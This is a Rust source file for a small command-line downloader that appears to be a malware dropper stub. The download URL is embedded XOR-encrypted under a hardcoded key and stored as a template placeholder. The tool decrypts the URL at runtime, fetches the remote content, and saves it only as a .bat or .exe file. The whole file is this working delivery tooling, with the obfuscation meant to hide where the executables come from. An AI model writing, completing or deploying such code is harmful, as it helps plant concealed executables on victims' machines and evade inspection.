use clap::Parser;
use reqwest::blocking::get;
use sha2::{Digest, Sha256};
use std::fs::File;
use std::io::Write;

const ENCRYPTION_KEY: &str = "GoDropEmbedKey2026";
const ENCRYPTED_URL_HEX: &str = "__ENC_URL__";

#[derive(Parser, Debug)]
#[command(author, version, about)]
struct Args {
    #[arg(long)]
    out: String,
    #[arg(long, default_value = "en")]
    locale: String,
    #[arg(long, default_value = "bat")]
    file_type: String,
}

fn message(locale: &str, key: &str) -> &'static str {
    match (locale, key) {
        ("es", "downloading") => "Descargando artefacto...",
        ("es", "saved") => "Guardado",
        ("fr", "downloading") => "Téléchargement de l'artefact...",
        ("fr", "saved") => "Enregistré",
        (_, "downloading") => "Downloading artifact...",
        (_, "saved") => "Saved",
        _ => "",
    }
}

fn decode_hex(hex: &str) -> Result<Vec<u8>, Box<dyn std::error::Error>> {
    if hex.len() % 2 != 0 {
        return Err("invalid hex length".into());
    }

    let mut out = Vec::with_capacity(hex.len() / 2);
    for i in (0..hex.len()).step_by(2) {
        out.push(u8::from_str_radix(&hex[i..i + 2], 16)?);
    }

    Ok(out)
}

fn decrypt_embedded_url() -> Result<String, Box<dyn std::error::Error>> {
    let cipher = decode_hex(ENCRYPTED_URL_HEX)?;
    let key = ENCRYPTION_KEY.as_bytes();
    let plain: Vec<u8> = cipher
        .iter()
        .enumerate()
        .map(|(i, b)| b ^ key[i % key.len()])
        .collect();

    Ok(String::from_utf8(plain)?)
}

fn main() -> Result<(), Box<dyn std::error::Error>> {
    let args = Args::parse();
    let file_type = args.file_type.to_lowercase();

    if file_type != "bat" && file_type != "exe" {
        return Err("Only .exe and .bat are supported".into());
    }

    let url = decrypt_embedded_url()?;
    if !url.starts_with("http://") && !url.starts_with("https://") {
        return Err("Embedded URL must use http or https".into());
    }

    println!("{}", message(&args.locale, "downloading"));
    let bytes = get(&url)?.bytes()?;

    let mut file = File::create(&args.out)?;
    file.write_all(&bytes)?;

    let mut hasher = Sha256::new();
    hasher.update(&bytes);
    let hash = hasher.finalize();

    println!("{}: {}", message(&args.locale, "saved"), args.out);
    println!("SHA256: {:x}", hash);
    Ok(())
}
